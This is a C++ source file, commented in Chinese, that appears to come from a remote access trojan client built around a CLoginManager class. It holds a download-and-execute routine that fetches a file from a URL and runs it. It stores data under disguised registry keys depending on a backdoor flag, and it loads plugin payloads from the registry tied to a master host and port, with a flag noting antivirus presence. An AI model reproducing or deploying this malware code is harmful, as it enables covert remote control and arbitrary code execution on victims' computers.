//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键)
int  CLoginManager::ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR * szData, LPBYTE szBytes, DWORD lbSize, int Mode)
{
	HKEY   hKey;
	int    ValueDWORD, iResult = 0;
	TCHAR* PointStr;
	TCHAR   KeyName[32], ValueSz[MAX_PATH], ValueTemp[MAX_PATH];
	DWORD  szSize, dwIndex = 0;

	memset(KeyName, 0, sizeof(KeyName));
	memset(ValueSz, 0, sizeof(ValueSz));
	memset(ValueTemp, 0, sizeof(ValueTemp));

	__try
	{
		if (RegOpenKeyEx(MainKey, SubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
		{
			iResult = -1;
			__leave;
		}
		switch (Mode)
		{
		case 0:
			switch (Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					lstrcpy(szData, ValueSz);
					iResult = 1;
				}
				break;
			case REG_MULTI_SZ:
				szSize = sizeof(ValueSz);
				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)ValueSz, &szSize) == ERROR_SUCCESS)
				{
					for (PointStr = ValueSz; *PointStr; PointStr = _tcschr(PointStr, 0) + 1)//strchr
					{
						_tcsncat_s(ValueTemp, PointStr, sizeof(ValueTemp));
						_tcsncat_s(ValueTemp, _T(" "), sizeof(ValueTemp));
					}
					lstrcpy(szData, ValueTemp);
					iResult = 1;
				}
				break;
			case REG_DWORD:
				szSize = sizeof(DWORD);

				if (RegQueryValueEx(hKey, Vname, NULL, &Type, (LPBYTE)&ValueDWORD, &szSize) == ERROR_SUCCESS)
				{
					wsprintf(szData, _T("%d"), ValueDWORD);
					iResult = 1;
				}
				break;
			case REG_BINARY:
				szSize = lbSize;

				if (RegQueryValueEx(hKey, Vname, NULL, &Type, szBytes, &szSize) == ERROR_SUCCESS)
				{
					wsprintf(szData, _T("%08X"), Type);
					iResult = 1;
				}
				break;
			}
			break;
		default:
			break;
		}
	}
	__finally
	{

		RegCloseKey(MainKey);
		RegCloseKey(hKey);
	}
	return iResult;
}



void CLoginManager::ReName(TCHAR * lpGBuffer, TCHAR * lpBuffer)
{
	HKEY hKey;
	::RegOpenKeyEx(HKEY_CURRENT_USER, m_IsBackDoor ? _T("AppEvents") : _T("Network"), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, lpGBuffer);
	::RegCloseKey(hKey);

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, m_IsBackDoor ? _T("AppEvents") : _T("Network"), &hKey))
	{
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, lpGBuffer, 0, REG_BINARY, (unsigned char*)lpBuffer, lstrlen(lpBuffer) * sizeof(TCHAR)))
		{
			::RegCloseKey(hKey);
			return;
		}
	}
	::RegCloseKey(hKey);
}

void CLoginManager::restart()
{
	PROCESS_INFORMATION   info;
	STARTUPINFO startup;
	TCHAR szPath[255];
	TCHAR* szCmdLine;
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	szCmdLine = GetCommandLine();
	GetStartupInfo(&startup);
	BOOL   bSucc = CreateProcess(szPath, szCmdLine, NULL, NULL,
		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &info);
	ExitProcess(-1);
	ExitProcess(0);
}

// 下载执行
unsigned CLoginManager::Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	TCHAR* lpURL = NULL;
	TCHAR* lpFileName = NULL;
	nUrlLength = lstrlen((TCHAR*)lparam);
	if (nUrlLength == 0)
		return false;
	lpURL = new TCHAR[nUrlLength + 1];
	memcpy(lpURL, lparam, nUrlLength * sizeof(TCHAR) + 2);
	lpFileName = _tcsrchr(lpURL, _T('/')) + 1;
	if (lpFileName == NULL || !http_get(lpURL, lpFileName) || !(GetFileAttributes(lpFileName) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND))
	{
		delete[]lpURL;
		return false;
	}
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = _T("WinSta0\\Default");
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	delete[]lpURL;
	return true;
}


void CLoginManager::EnumRegeditData(TCHAR* lpszSubKey)
{
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpszSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (lRet == ERROR_SUCCESS) {
		DWORD dwValueCount = 0, maxValueNameLen = 0, maxValueDataLen = 0;
		lRet = RegQueryInfoKey(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &dwValueCount, &maxValueNameLen, &maxValueDataLen, NULL, NULL);
		if (lRet == ERROR_SUCCESS) {
			DWORD dwNameLen = maxValueNameLen + 1;
			TCHAR* pszName = new TCHAR[dwNameLen];

			DWORD dwType = 0;
			DWORD dwValueDataLen = maxValueDataLen + 1;
			BYTE* lpValueData = new BYTE[dwValueDataLen];

			for (DWORD dwIndex = 0; dwIndex < dwValueCount; ++dwIndex) {
				dwNameLen = maxValueNameLen + 1;
				ZeroMemory(pszName, dwNameLen);

				dwValueDataLen = maxValueDataLen + 1;
				ZeroMemory(lpValueData, dwValueDataLen);

				lRet = RegEnumValue(hKey, dwIndex, pszName, &dwNameLen, NULL, &dwType, lpValueData, &dwValueDataLen);
				//Other operations
				CString strValueName;
				strValueName.Format(_T("%s"), pszName);
			//	MessageBox(strValueName);           //子键名称

			//	CString strValueData;
			//	strValueData.Format(_T("%s"), lpValueData);
			//	MessageBox(strValueData);           //子键的value


				DllSendDate* temp = new DllSendDate;  //new
				memcpy(temp, lpValueData, sizeof(DllSendDate));

				DllDate* m_DllDate = new DllDate;		//new
				memcpy(m_DllDate, lpValueData + sizeof(DllSendDate), sizeof(DllDate));


				BYTE* Date = new BYTE[temp->DateSize];		//new
				::memcpy(Date, lpValueData + sizeof(DllSendDate)+sizeof(DllDate), temp->DateSize);

				m_DllDate->m_sendate = temp;
				m_DllDate->delldate = Date;
				m_DllDate->m_strMasterHost = m_strMasterHost;
				m_DllDate->m_nMasterPort = m_nMasterPort;
				m_DllDate->IsTcp = IsTcp;
				m_DllDate->m_bhaveAV = m_bhaveAV;
				m_DllDate->m_CLoginManager = this;
				v_dlldates.push_back(m_DllDate);
			}
			delete[] pszName;
			delete[] lpValueData;
			RegCloseKey(hKey);
		}
	}

}